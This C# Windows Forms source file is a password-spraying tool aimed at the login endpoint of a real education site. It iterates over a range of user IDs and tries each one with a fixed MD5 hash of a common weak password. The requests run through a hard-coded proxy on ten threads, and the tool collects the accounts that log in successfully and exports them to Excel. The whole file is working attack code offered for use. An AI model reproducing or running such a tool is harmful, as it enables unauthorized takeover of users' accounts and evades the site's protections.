using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using helper;

namespace _202007
{
    public partial class yxw : Form
    {
        public yxw()
        {
            InitializeComponent();
        }

       
        string IP= "223.243.5.106:42326";
        ArrayList lists = new ArrayList(); 
        public void run()
        {
            for (long i = Convert.ToInt64(textBox1.Text); i < Convert.ToInt64(textBox2.Text); i++)
            {
                if (!lists.Contains(i))
                {
                    lists.Add(i);
                    string url = "http://pp.yanxiu.com/sso/loginNew.jsp?callback=jQuery110207211052624197256_1592025714422&userid="+i+"&appid=f6de93f8-c589-4aa7-9eb1-92f4afb4aea5&password=e10adc3949ba59abbe56e057f20f883e";
                    string html = method.GetUrlwithIP(url, IP);
                    Match status = Regex.Match(html, @"login_status"":([\s\S]*?),");
                    if (status.Groups[1].Value=="0")
                    {
                        ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count + 1).ToString()); //使用Listview展示数据    
                        lv1.SubItems.Add(i.ToString());
                    }
                    label3.Text = i.ToString();
                }
            }
           
        }
        private void yxw_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

            for (int i = 0; i < 10; i++)
            {
                Thread thread = new Thread(new ThreadStart(run));
                Control.CheckForIllegalCrossThreadCalls = false;
                thread.Start();
            }
               
           
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            method.DataTableToExcel(method.listViewToDataTable(this.listView1), "Sheet1", true);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }
    }
}
